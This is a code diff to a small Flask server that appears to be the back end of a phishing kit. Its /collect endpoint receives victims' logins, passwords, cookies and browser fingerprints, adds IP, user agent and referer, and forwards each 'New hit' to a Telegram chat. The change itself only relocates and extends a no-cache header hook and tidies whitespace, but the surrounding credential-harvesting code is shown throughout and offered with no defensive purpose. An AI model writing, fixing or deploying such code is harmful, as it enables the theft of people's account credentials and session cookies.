@@ -23,17 +23,25 @@ def send_to_tg(text: str):
     except Exception as e:
         print("TG error:", e)
 
+@app.after_request
+def add_no_cache(response):
+    if response.mimetype == "text/html":
+        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
+        response.headers["Pragma"] = "no-cache"
+        response.headers["Expires"] = "0"
+    return response
+
 @app.route("/collect", methods=["POST"])
 def collect():
     data = request.get_json(force=True, silent=True) or {}
-    
+
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
         ip = ip.split(",")[0].strip()
-    
+
     ua = request.headers.get("User-Agent", "—")
     ref = request.headers.get("Referer", "—")
-    
+
     screen   = data.get("screen", "—")
     lang     = data.get("lang", "—")
     tz       = data.get("tz", "—")
@@ -43,9 +51,9 @@ def collect():
     page     = data.get("url", "—")
     login    = data.get("login", "—")
     password = data.get("password", "—")
-    
+
     now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
-    
+
     msg = f"""🚨 <b>New hit</b>
 ⏰ {now}
 🔑 <b>Login:</b> <code>{login}</code>
@@ -60,7 +68,7 @@ def collect():
 📎 <b>Referer:</b> {ref}
 🍪 <b>Cookies:</b> <code>{str(cookies)[:250]}</code>
 🧬 <b>FP:</b> <code>{fp}</code>"""
-    
+
     send_to_tg(msg)
     return jsonify({"ok": True})
 
@@ -71,8 +79,3 @@ def index():
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
-    @app.after_request
-def add_no_cache(response):
-    if response.mimetype == "text/html":
-        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
-    return response
